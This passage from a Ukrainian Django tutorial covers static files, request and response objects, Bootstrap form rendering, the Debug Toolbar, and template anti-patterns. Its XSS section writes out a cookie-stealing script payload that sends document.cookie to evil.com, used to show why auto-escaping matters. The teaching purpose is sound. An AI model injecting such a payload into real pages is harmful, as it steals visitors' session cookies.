- **❌ Типова помилка початківця:** Забути `{% load static %}` на початку шаблону і отримати `TemplateSyntaxError: Invalid block tag: 'static'`. Або хардкодити `/static/css/style.css` замість `{% static 'path' %}` — ці посилання зламаються при деплої на сервер з іншим STATIC_URL.
---

## 5. Static Files — Статичні файли

**Чому статика — НЕ завдання Django в продакшині:**
```
Development: 
  Browser → Django (DEBUG=True) → знаходить static файли → відповідає

Production:
  1. python manage.py collectstatic → копіює ВСІ static у STATIC_ROOT
  2. Browser → Nginx → знаходить файл у STATIC_ROOT → відповідає
  3. Django взагалі не бере участі у роздачі static файлів!
  4. Набагато швидше: немає Python overhead для CSS/JS/зображень
```

**Чому `{% static 'path' %}` замість хардкоду:** якщо `STATIC_URL` зміниться (наприклад, при переході на CDN: `STATIC_URL = 'https://cdn.example.com/static/'`), всі твої шаблонні посилання оновляться автоматично. Хардкодений URL `/static/css/style.css` залишиться зламаним.

### Конфігурація

Ці три налаштування settings.py визначають де Django шукає статику, де її роздає, і куди збирає для продакшину. `STATICFILES_DIRS` — для кастомних файлів поза додатками. `STATIC_ROOT` — тільки для `collectstatic`.

```python
# settings.py
STATIC_URL = '/static/'

# Папка для зберігання кастомних статичних файлів
STATICFILES_DIRS = [
    BASE_DIR / 'static',
]

# Для продакшину: куди збирати всі static файли
STATIC_ROOT = BASE_DIR / 'staticfiles'
```

### Структура папок

```
hello_app/
└── static/
    └── hello_app/            ← namespace (ім'я додатку)
        ├── css/
        │   ├── custom.css    ← кастомні стилі поверх Bootstrap
        │   └── dark-theme.css
        ├── js/
        │   └── notes.js      ← JS для нотаток
        └── img/
            └── logo.png
```

### Використання в шаблонах

Зверни: `{% load static %}` — обов'язково ПЕРШИМ у файлі перед будь-яким використанням `{% static %}`. Bootstrap підключається через CDN — він не є "твоїм" static файлом, тому не потребує `{% static %}`. Твоя кастомна CSS підключається через `{% static %}`.

```html
{% load static %}  {# ОБОВ'ЯЗКОВО перед першим {% static %} #}
<!DOCTYPE html>
<html>
<head>
    {# CSS Bootstrap — CDN (не через {% static %}) #}
    <link href="https://cdn.jsdelivr.net/...bootstrap.min.css" rel="stylesheet">

    {# Кастомний CSS — через {% static %} #}
    <link rel="stylesheet" href="{% static 'hello_app/css/custom.css' %}">

    {# Favicon #}
    <link rel="icon" href="{% static 'hello_app/img/favicon.ico' %}">
</head>
<body>
    {# Зображення #}
    <img src="{% static 'hello_app/img/logo.png' %}" alt="Логотип" width="120">

    {# JavaScript #}
    <script src="{% static 'hello_app/js/notes.js' %}"></script>
</body>
</html>
```

### `collectstatic` для продакшину

**Що відбувається з твоїми static файлами від розробки до production:**

```
Development:
  Browser → Django dev server (runserver)
              ↓
              Django знаходить static файли в hello_app/static/
              і роздає їх напряму
              (повільно, але зручно — зміни видно одразу)

Production:
  КРОК 1: python manage.py collectstatic
              ↓
              Обходить static/ у КОЖНОМУ встановленому додатку
              + django.contrib.admin/static/
              + unfold/static/
              ↓
              Копіює ВСЕ у STATIC_ROOT=/app/staticfiles/

  КРОК 2: Nginx конфігурація:
              location /static/ {
                alias /app/staticfiles/;   ← напряму з диску
              }
              ↓
  Browser → Nginx → staticfiles/ на диску
              Django ВЗАГАЛІ НЕ БЕРЕ УЧАСТІ
              (в 100x швидше для статичних файлів)
```

`collectstatic` — одноразова команда при деплої. Вона обходить усі встановлені додатки, знаходить їхні `static/` папки та копіює вміст у `STATIC_ROOT`. Після цього Nginx роздає ці файли без участі Django.

```bash
# Збирає всі static з усіх додатків у STATIC_ROOT
python manage.py collectstatic

# Nginx роздає static напряму — без Django
# location /static/ {
#     alias /app/staticfiles/;
# }
```

> **Анти-патерн:** хардкодити URL статики — `/static/css/style.css`.
> Якщо STATIC_URL зміниться або CDN буде підключений — все зламається.
> Завжди `{% static 'path' %}`.

---

## 6. HttpRequest та HttpResponse — HTTP-рівень

### HttpRequest — що Django отримує

Зверни на повноту `request` об'єкта: він містить все про HTTP-запит. `request.user` доступний тому що `AuthenticationMiddleware` обробляє кожен запит і встановлює `request.user` автоматично.

```python
def note_detail(request, pk):
    # request — об'єкт HttpRequest з усіма даними запиту

    request.method      # 'GET', 'POST', 'PUT', 'DELETE'
    request.GET         # QueryDict: GET параметри з URL (?q=django&page=2)
    request.POST        # QueryDict: POST дані з форми
    request.FILES       # Завантажені файли
    request.headers     # HTTP заголовки (User-Agent, Accept-Language, ...)
    request.COOKIES     # Cookies браузера
    request.session     # Django сесія (dict-like)
    request.user        # Авторизований користувач (AnonymousUser або User)
    request.path        # '/notes/42/'
    request.META        # Повний WSGI environ
    request.META['HTTP_HOST']          # 'localhost:8000'
    request.META['REMOTE_ADDR']        # IP-адреса клієнта
    request.META['HTTP_USER_AGENT']    # браузер
```

### HTTP Request структура

```
GET /notes/42/ HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml,...
Accept-Language: uk,en;q=0.9
Cookie: sessionid=abc123def456; csrftoken=xyz789
```

**Ключові заголовки для Django:**
- `Cookie: sessionid=...` → Django читає сесію → `request.user`
- `Cookie: csrftoken=...` → Django перевіряє CSRF при POST
- `Accept-Language` → Django i18n/l10n

### HttpResponse — що Django повертає

Django має кілька типів відповідей для різних сценаріїв. `redirect()` повертає код 302, `raise Http404` повертає 404. `get_object_or_404()` — зручний shortcut, що автоматично піднімає 404 якщо об'єкт не знайдено в БД.

```python
from django.http import (
    HttpResponse,
    HttpResponseRedirect,
    HttpResponseNotFound,
    JsonResponse,
    Http404,
)
from django.shortcuts import render, redirect, get_object_or_404

# Простий текст (для тестування)
return HttpResponse("Hello, Django!")

# HTML через render() — найчастіший варіант
return render(request, 'hello_app/note_list.html', context)

# Redirect (після POST → PRG паттерн)
return redirect('hello_app:note_list')
return HttpResponseRedirect('/notes/')

# 404 через виключення (Django покаже сторінку 404.html)
raise Http404("Нотатку не знайдено")

# Або через get_object_or_404 (автоматично)
note = get_object_or_404(Note, pk=pk)

# JSON для AJAX запитів
return JsonResponse({'status': 'ok', 'id': note.pk})
return JsonResponse({'errors': form.errors}, status=400)
```

### HTTP Response структура

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: sessionid=abc123; HttpOnly; SameSite=Lax
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html>...повний HTML-документ...</html>
```

**Статус-коди Django:**

| Код | Що означає | Де в Django |
|-----|-----------|------------|
| `200 OK` | Успіх | `HttpResponse()` за замовчуванням |
| `201 Created` | Ресурс створено | `JsonResponse(status=201)` |
| `301 Moved Permanently` | Постійний redirect | `redirect(..., permanent=True)` |
| `302 Found` | Тимчасовий redirect | `redirect(...)` |
| `400 Bad Request` | Помилка клієнта | `HttpResponse(status=400)` |
| `403 Forbidden` | Немає прав | `PermissionDenied` виключення |
| `404 Not Found` | Не знайдено | `raise Http404` |
| `500 Server Error` | Помилка сервера | Незловлений виняток |

---

---
- **🧠 Ментальна модель:** Django Forms — це "розумний посередник" між браузером і базою даних. Уяви форму як охоронця: вона перевіряє кожне поле, відхиляє невалідні дані ДО того як вони потраплять у БД, і повертає зрозумілі повідомлення про помилки.
- **📚 Чому це існує:** Без Django Forms тобі довелося б вручну: парсити `request.POST`, перевіряти кожне поле, генерувати повідомлення про помилки, захищатися від SQL-ін'єкцій і XSS. Django Forms робить все це автоматично і правильно.
- **🌐 Що відбувається під капотом:** `form.is_valid()` запускає повний цикл валідації: спочатку `to_python()` (перетворення типів), потім `validate()` (вбудована валідація), потім `run_validators()` (кастомні валідатори), і нарешті `clean()` (крос-польова валідація). Якщо будь-який крок провалюється — `is_valid()` повертає `False` і `form.errors` містить детальні повідомлення.
- **❌ Типова помилка початківця:** Виклик `form.save()` без попередньої перевірки `form.is_valid()`. Або не використовувати PRG паттерн після успішного збереження — що призводить до дублювання записів при оновленні сторінки.
---

## 7. Bootstrap Forms + Django Forms

**4 стратегії інтеграції Bootstrap з Django Forms — від максимального контролю до мінімального коду:**
```
Ручний HTML     → максимальний контроль, найбільше коду
Widget attrs    → середній контроль, менше коду
django-bootstrap5 → мінімум коду, менше гнучкості
crispy-forms    → найкращий баланс (докладніше: ADVANCED_TEMPLATES.md)
```

**Навіщо Django Forms існують — повний цикл:**
```
GET запит (показати порожню форму):
  form = NoteForm()         ← порожня форма без даних
  render(template, {'form': form})  ← показати чисту форму

POST запит (невалідні дані):
  form = NoteForm(request.POST)  ← заповнити форму даними
  form.is_valid()           ← повертає False
  render(template, {'form': form})  ← показати форму з помилками і введеними даними

POST запит (валідні дані):
  form = NoteForm(request.POST)
  form.is_valid()           ← повертає True
  form.save()               ← записати до бази даних
  redirect(...)             ← PRG патерн (Post-Redirect-Get)
```

### Стратегії підключення Bootstrap до Django Form

```
Варіант 1: Ручний HTML                → повний контроль, багато коду
Варіант 2: Кастомні widgets            → widgets з class='form-control'
Варіант 3: django-bootstrap5           → {% bootstrap_form form %}
Варіант 4: django-crispy-forms         → найгнучкіший, FormHelper layouts
```

### Анатомія одного поля форми Bootstrap + Django

Перш ніж дивитись на повний шаблон — зрозумій що відбувається для ОДНОГО поля. Кожне поле складається з чотирьох HTML-елементів:

```
┌─────────────────────────────────────────────────┐
│ <div class="mb-3">          ← відступ між полями │
│   <label>                   ← підпис поля        │
│     {{ form.title.label }}  ← "Заголовок"        │
│   </label>                                       │
│                                                  │
│   <input class="form-control   ← Bootstrap стиль │
│           is-invalid">         ← якщо є помилка  │
│     value="{{ form.title.value }}" ← поточне     │
│   />                                             │
│                                                  │
│   <div class="invalid-feedback"> ← тільки при   │
│     {{ error }}                  ← помилці       │
│   </div>                                         │
│ </div>                                           │
└─────────────────────────────────────────────────┘
```

**Ключові Django form атрибути в шаблоні:**
- `form.title.id_for_label` → `"id_title"` (Django генерує ID автоматично)
- `form.title.html_name` → `"title"` (ім'я для `name=""` атрибуту input)
- `form.title.value` → поточне значення поля (порожньо для нової форми, або введені дані при помилці валідації)
- `form.title.errors` → список помилок (порожній при успіху)
- `form.title.field.required` → `True`/`False` (з Model definition)

**Чому `novalidate` на `<form>`:** Без `novalidate` браузер виконує HTML5 валідацію `required` поля ДО відправки форми. Це "зламує" UX: браузерні підказки про помилки виглядають інакше на різних браузерах і не контролюються Django. З `novalidate` — вся валідація на сервері, Django form.errors — єдиний і консистентний спосіб відображення помилок.

### Варіант 1: Ручний HTML (максимальний контроль)

Цей шаблон показує НАЙДОКЛАДНІШИЙ спосіб рендерингу форми. Зверни на `form.title.id_for_label` — Django автоматично генерує ID для кожного поля форми. Зверни на умовний клас `is-invalid` — він підсвічує поле червоним лише якщо є помилки. Зверни на `form.non_field_errors` — це помилки з методу `clean()` форми, які стосуються не одного поля, а всієї форми.

```html
{% block content %}
<div class="row justify-content-center">
    <div class="col-md-8 col-lg-6">
        <div class="card border-0 shadow-sm">
            <div class="card-header bg-white">
                <h4 class="mb-0">Нова нотатка</h4>
            </div>
            <div class="card-body">
                <form method="post" novalidate>
                    {% csrf_token %}

                    {# Поле title #}
                    <div class="mb-3">
                        <label for="{{ form.title.id_for_label }}" class="form-label fw-semibold">
                            {{ form.title.label }}
                            {% if form.title.field.required %}
                            <span class="text-danger">*</span>
                            {% endif %}
                        </label>
                        <input
                            type="text"
                            class="form-control {% if form.title.errors %}is-invalid{% endif %}"
                            id="{{ form.title.id_for_label }}"
                            name="{{ form.title.html_name }}"
                            value="{{ form.title.value|default:'' }}"
                            placeholder="Заголовок нотатки"
                        >
                        {% for error in form.title.errors %}
                        <div class="invalid-feedback">{{ error }}</div>
                        {% endfor %}
                    </div>

                    {# Поле content #}
                    <div class="mb-3">
                        <label for="{{ form.content.id_for_label }}" class="form-label fw-semibold">
                            {{ form.content.label }}
                        </label>
                        <textarea
                            class="form-control {% if form.content.errors %}is-invalid{% endif %}"
                            id="{{ form.content.id_for_label }}"
                            name="{{ form.content.html_name }}"
                            rows="6"
                            placeholder="Текст нотатки..."
                        >{{ form.content.value|default:'' }}</textarea>
                        {% for error in form.content.errors %}
                        <div class="invalid-feedback">{{ error }}</div>
                        {% endfor %}
                        <div class="form-text">Необов'язкове поле</div>
                    </div>

                    {# Non-field errors (наприклад, з clean()) #}
                    {% if form.non_field_errors %}
                    <div class="alert alert-danger">
                        {% for error in form.non_field_errors %}
                        <p class="mb-0">{{ error }}</p>
                        {% endfor %}
                    </div>
                    {% endif %}

                    <div class="d-flex gap-2">
                        <button type="submit" class="btn btn-primary">Зберегти</button>
                        <a href="{% url 'hello_app:note_list' %}"
                           class="btn btn-outline-secondary">Скасувати</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
{% endblock %}
```

### Варіант 2: Widgets з Bootstrap classes

Цей підхід переносить конфігурацію Bootstrap-класів у `forms.py`. Шаблон стає значно коротшим — він лише ітерує по полях форми. Метод `clean_title` показує як додати кастомну валідацію для окремого поля: завжди починається з `clean_` + назва поля, завжди повертає очищене значення.

```python
# forms.py
from django import forms
from .models import Note

class NoteForm(forms.ModelForm):
    class Meta:
        model = Note
        fields = ['title', 'content']
        widgets = {
            'title': forms.TextInput(attrs={
                'class': 'form-control',
                'placeholder': 'Заголовок нотатки',
            }),
            'content': forms.Textarea(attrs={
                'class': 'form-control',
                'rows': 6,
                'placeholder': 'Текст нотатки...',
            }),
        }
        labels = {
            'title': 'Заголовок',
            'content': 'Текст',
        }
        help_texts = {
            'content': 'Необов\'язкове поле.',
        }

    def clean_title(self):
        title = self.cleaned_data['title']
        if len(title) < 3:
            raise forms.ValidationError('Заголовок має бути не менше 3 символів.')
        return title.strip()
```

Цей шаблон коротший ніж Варіант 1 бо Bootstrap-клас `form-control` вже є у Widget. `{{ field }}` рендерить повний `<input>` або `<textarea>` з усіма атрибутами, заданими у Widget. Ітерація `{% for field in form %}` дозволяє обробити всі поля однаково.

```html
{# Шаблон — коротший варіант через form.as_p() або ітерацію #}
<form method="post">
    {% csrf_token %}
    {% for field in form %}
    <div class="mb-3">
        <label for="{{ field.id_for_label }}" class="form-label">
            {{ field.label }}{% if field.field.required %} *{% endif %}
        </label>
        {{ field }}  {# ← рендерить input з class='form-control' з Widget #}
        {% if field.errors %}
            {% for error in field.errors %}
            <div class="text-danger small mt-1">{{ error }}</div>
            {% endfor %}
        {% endif %}
        {% if field.help_text %}
        <div class="form-text">{{ field.help_text }}</div>
        {% endif %}
    </div>
    {% endfor %}
    <button type="submit" class="btn btn-primary">Зберегти</button>
</form>
```

### Варіант 3: django-bootstrap5 (найшвидший)

Бібліотека `django-bootstrap5` генерує повну Bootstrap-розмітку для кожного поля форми. `{% bootstrap_form form %}` рендерить всі поля з правильними label, help_text, і стилями помилок автоматично. Ціна — менше контролю над розміткою.

```bash
pip install django-bootstrap5
```

```python
# settings.py
INSTALLED_APPS = [..., 'django_bootstrap5']
```

```html
{% load django_bootstrap5 %}
{% bootstrap_css %}
{% bootstrap_javascript %}

<form method="post">
    {% csrf_token %}
    {% bootstrap_form form %}
    {% bootstrap_button "Зберегти" button_type="submit" button_class="btn-primary" %}
    <a href="{% url 'hello_app:note_list' %}" class="btn btn-outline-secondary ms-2">
        Скасувати
    </a>
</form>
```

### Bootstrap Validation — Server + Client

Цей view показує повний CRUD-цикл з валідацією. Зверни на `messages.success()` — повідомлення зберігається в сесії і відображається в `base.html` через `{% if messages %}`. Зверни на `redirect()` після `form.save()` — це PRG паттерн, він запобігає дублюванню даних при оновленні сторінки.

```python
# views.py
from django.contrib import messages

def note_create(request):
    if request.method == 'POST':
        form = NoteForm(request.POST)
        if form.is_valid():
            note = form.save()
            messages.success(request, f'Нотатку "{note.title}" успішно збережено!')
            return redirect('hello_app:note_list')  # PRG паттерн
        else:
            messages.error(request, 'Виправте помилки у формі.')
    else:
        form = NoteForm()
    return render(request, 'hello_app/note_form.html', {'form': form})
```

```
Validation Architecture:
1. HTML5 validation (браузер) → disabled через novalidate
2. Django form.is_valid()     → server-side validation
3. form.errors → шаблон      → Bootstrap .is-invalid стилі
4. messages framework         → Bootstrap alert
```

> **Критичний anti-pattern:** Покладатись лише на колір (червоні рамки)
> для повідомлень про помилки — провалює для людей з дальтонізмом і скрінрідерів.
> Завжди додавай текстове повідомлення через `.invalid-feedback`.

---

---
- **🧠 Ментальна модель:** Django Debug Toolbar — це "рентген" для твого Django додатку. Звичайний браузер показує тільки HTML-результат. DjDT показує все що відбулося ВСЕРЕДИНІ: скільки SQL-запитів виконалось, який context отримав шаблон, скільки часу зайняло кожне middleware.
- **📚 Чому це існує:** Без DjDT ти "сліпий" — бачиш лише кінцевий результат. З DjDT ти бачиш N+1 проблеми (51 SQL замість 1), бачиш точний context шаблону, бачиш час виконання кожного запиту. Це незамінний інструмент для оптимізації.
- **🌐 Що відбувається під капотом:** DjDT встановлюється як middleware. Він перехоплює кожен запит, збирає статистику (SQL через Django ORM logging, templates через signal hooks, signals через Django's signal framework), і вставляє свою панель у відповідь HTML перед `</body>`.
- **❌ Типова помилка початківця:** Дивитися на сторінку і думати "все нормально, 15 нотаток відображаються". DjDT відкривається і показує: 152 SQL-запити за 2.3 секунди. Без DjDT ця проблема непомітна, поки сайт не впаде під навантаженням.
---

## 8. Django Debug Toolbar — Інспекція шаблонів

**PRG Паттерн (Post-Redirect-Get) — чому він обов'язковий:**

```
Проблема БЕЗ PRG:
  1. Користувач відправляє форму (POST /notes/create/)
  2. Django зберігає запис у БД, повертає HTML зі сторінкою
  3. Користувач натискає F5 (оновлення)
  4. Браузер каже: "Повторно надіслати POST-дані?"
  5. Користувач натискає OK → Django знову зберігає → ДУБЛІКАТ у БД!

PRG Паттерн (Post-Redirect-Get):
  1. Користувач відправляє форму (POST /notes/create/)
  2. Django зберігає запис у БД, повертає REDIRECT 302 → /notes/
  3. Браузер автоматично робить GET /notes/
  4. Django повертає HTML список нотаток
  5. Користувач натискає F5 → безпечний GET → ніякого дубліката!
```

**N+1 Проблема — найпоширеніша проблема продуктивності Django:**

```
Список 50 нотаток, кожна показує {{ note.author.username }}

Без select_related (N+1 проблема):
  SQL #1: SELECT * FROM notes ORDER BY created_at (50 рядків)
  SQL #2: SELECT * FROM users WHERE id=1   ← для нотатки 1
  SQL #3: SELECT * FROM users WHERE id=7   ← для нотатки 2
  ...
  SQL #51: SELECT * FROM users WHERE id=N  ← для нотатки 50
  = 51 SQL-запит! Для 1000 нотаток = 1001 запит!

З select_related('author'):
  SQL #1: SELECT notes.*, users.* FROM notes JOIN users ON notes.author_id=users.id
  = 1 SQL-запит! Незалежно від кількості нотаток.

Виправлення у view:
  notes = Note.objects.all().select_related('author')
```

### SQL Panel — знайди N+1 проблему

DjDT SQL Panel показує КОЖЕН SQL-запит окремо з часом виконання. Якщо бачиш 101 запит для сторінки зі 100 записами — це класична N+1 проблема. Натисни EXPLAIN на підозрілому запиті щоб побачити план виконання PostgreSQL.

```
DjDT SQL Panel показує:
────────────────────────────────────────────────────────
#  | Time  | SQL
── | ────── | ────────────────────────────────────────
1  | 0.3ms  | SELECT * FROM hello_app_note ORDER BY -created_at
2  | 0.1ms  | SELECT * FROM auth_user WHERE id=1      ← дублікат!
3  | 0.1ms  | SELECT * FROM auth_user WHERE id=1      ← дублікат!
...
101| 0.1ms  | SELECT * FROM auth_user WHERE id=N      ← N+1 проблема
────────────────────────────────────────────────────────
101 queries | 12.4ms total
```

**Кнопка EXPLAIN:** біля кожного SELECT → план виконання запиту від PostgreSQL.
Показує чи використовується INDEX або FULL SCAN.

### Templates Panel — інспекція контексту

Templates Panel показує ТОЧНИЙ словник context, який отримав шаблон. Це найважливіший інструмент для дебагу "чому змінна не відображається" — ти бачиш реальні дані, не припущення. Зверни: `user` і `request` є в context автоматично завдяки context processors в settings.py.

```
DjDT Templates Panel:
────────────────────────────────────────────────────────
hello_app/note_list.html (base → hello_app/base.html)
    ↓ Toggle context ↓
{
    'notes': <QuerySet [<Note: Перша>, <Note: Друга>]>,
    'total': 2,
    'user_name': 'admin',
    'is_staff': True,
    'request': <WSGIRequest GET '/notes/'>,
    'user': <User: admin>    ← автоматично через context_processor
}
```

> **Якщо змінна не відображається:** відкрий Context в DjDT.
> Чи є вона в словнику? Правильна назва? Не `userid` замість `user_id`?

---

---
- **🧠 Ментальна модель:** Анти-патерни в шаблонах — це як "тріщини в стіні". Зараз здається нічого страшного. Але кожна тріщина збільшується: хардкодений URL зламається при реструктуризації, бізнес-логіка в шаблоні стане нетестованою, відсутній `|escape` відкриє XSS-вразливість.
- **📚 Чому це існує:** Ці анти-патерни виникають бо "так простіше зараз". Але в реальних проєктах "просто зараз" → "дуже дорого потім". Знання анти-патернів рятує від технічного боргу.
- **🌐 Що відбувається під капотом:** XSS (Cross-Site Scripting) — це атака де зловмисник вставляє JavaScript у сторінку через user-generated content. Django автоматично екранує `{{ }}` виводи, перетворюючи `<script>` на `&lt;script&gt;`. `|safe` ВИМИКАЄ цей захист — використовуй його ТІЛЬКИ для контенту, якому ти 100% довіряєш.
- **❌ Типова помилка початківця:** Хардкодити URL у шаблонах `href="/notes/"` замість `{% url 'hello_app:note_list' %}`. Або писати `{{ comment.text|safe }}` для коментарів користувача — це пряма XSS-вразливість.
---

## 9. Анти-патерни та типові помилки

**XSS (Cross-Site Scripting) — як Django захищає і де є небезпека:**

```
БЕЗ Django auto-escaping (або з |safe для user input):
  Зловмисник вводить у поле "Ім'я": <script>document.location='evil.com?c='+document.cookie</script>
  {{ user.name|safe }} → рендерить як СПРАВЖНІЙ SCRIPT TAG
  → Браузер ВИКОНУЄ скрипт зловмисника!
  → Зловмисник отримує cookies всіх відвідувачів сторінки!

З Django auto-escaping (за замовчуванням):
  {{ user.name }} → рендерить як:
  &lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;
  → Браузер показує ТЕКСТ, не виконує скрипт
  → Атака не вдалась!

Правила безпеки:
  {{ user_content }}        ← БЕЗПЕЧНО (auto-escape увімкнено)
  {{ user_content|safe }}   ← НЕБЕЗПЕЧНО для user input, безпечно для свого контенту
  {{ user_content|striptags }} ← БЕЗПЕЧНО (видаляє HTML теги)
  {{ user_content|escape }} ← явне екранування (надлишково, але нешкідливо)
```

### Template Anti-patterns

Бізнес-логіка в шаблоні — не тільки неправильно архітектурно, а й непрактично: шаблонні умови не тестуються unit-тестами, не перевикористовуються, важко дебажити. Виноси логіку у view і передавай готовий булеан.

```python
# ❌ Бізнес-логіка в шаблоні
{% if notes|length > 10 and user.subscription.plan == 'pro' %}
    {# Логіка що не тестується, не перевикористовується #}
{% endif %}

# ✅ Логіка у View — шаблон отримує готовий результат
# views.py
can_see_all = user.subscription.plan == 'pro' and notes.count() > 10
return render(request, '...', {'can_see_all': can_see_all})
```

Хардкоді URL — технічний борг. Коли URL-структура зміниться (а вона завжди змінюється), тобі доведеться шукати і замінювати у всіх шаблонах. `{% url %}` оновлюється автоматично.

```python
# ❌ Хардкодований URL у шаблоні
<a href="/notes/{{ note.pk }}/">Читати</a>

# ✅ Безпечне іменоване посилання
<a href="{% url 'hello_app:note_detail' pk=note.pk %}">Читати</a>
```

```python
# ❌ Хардкоди static URL
<link rel="stylesheet" href="/static/css/style.css">

# ✅ Динамічне посилання
{% load static %}
<link rel="stylesheet" href="{% static 'hello_app/css/style.css' %}">
```

HTML у Python View — порушення MVT-архітектури. View не повинна знати про HTML. Також це відкриває XSS-вразливості якщо рядки не екрануються, і унеможливлює масштабування (як редагувати HTML у Python-рядку?).

```html
{# ❌ HTML в Python View #}
def my_view(request):
    return HttpResponse("<h1>Hello</h1><p>...</p>")
{# Ламає MVT, неможливо масштабувати, помилки XSS #}

{# ✅ Завжди через шаблон #}
def my_view(request):
    return render(request, 'my_template.html', {'name': 'World'})
```

Відсутній CSRF-токен — Django поверне `403 Forbidden` при POST. Це не баг — це захист. Якщо бачиш 403 при відправці форми — перевір чи є `{% csrf_token %}` першим рядком всередині `<form>`.

```html
{# ❌ POST форма без csrf_token #}
<form method="post">
    <input name="title">
    <button type="submit">Save</button>
</form>
{# → Django поверне 403 Forbidden #}

{# ✅ Завжди додавай #}
<form method="post">
    {% csrf_token %}
    ...
</form>
```

### Secure Template Output

Auto-escaping в Django активний за замовчуванням для всіх `{{ }}` виводів. `|safe` — це "вимикач захисту" — використовуй ТІЛЬКИ коли абсолютно впевнений що контент безпечний (наприклад, HTML який згенерував сам Django, або контент з перевіреного markdown-парсера). НІКОЛИ не застосовуй `|safe` до user-generated content.

```html
{# Django екранує {{ }} автоматично — захист від XSS #}
{# Якщо user.bio = '<script>alert("xss")</script>' #}
{{ user.bio }}
{# → &lt;script&gt;alert("xss")&lt;/script&gt; — безпечний текст #}

{# |safe — ВИМИКАЄ захист! Тільки для ДОВІРЕНОГО HTML #}
{{ article.body|safe }}
{# ← Небезпечно для user-generated content! #}

{# Безпечна альтернатива для HTML контенту #}
{{ article.body|striptags }}       {# видалити теги, залишити текст #}
{{ article.body|linebreaks }}      {# \n → <p>, безпечно #}
```

---

## 10. Питання для самоперевірки

1. У шаблоні написано `{{ user_id }}`, але view передає `{'userid': 42}`. Що побачить браузер? Чи впаде сервер?
2. Чому `{% extends 'base.html' %}` ОБОВ'ЯЗКОВО має бути першим рядком шаблону?
3. Яка різниця між `{% include %}` і `{% extends %}`? Коли що використовувати?
4. View не передав змінну `notes` в context. Шаблон має `{% for note in notes %}`. Що станеться?
5. Чому після успішного POST потрібен redirect (PRG паттерн)? Що станеться без нього?
6. `{% url 'note_detail' pk=note.pk %}` не знаходить URL. Чому? Які можливі причини?
7. `{% csrf_token %}` у GET-формі (пошук). Чи потрібен він? Чому?
8. Форма повертає помилку але поле підсвічене зеленим замість червоного. Де шукати баг?
9. `{{ article.body|safe }}` — коли це прийнятно і коли небезпечно?
10. В Django Debug Toolbar SQL Panel показує 150 запитів для сторінки з 15 нотатками. Яка ймовірна причина і як виправити?
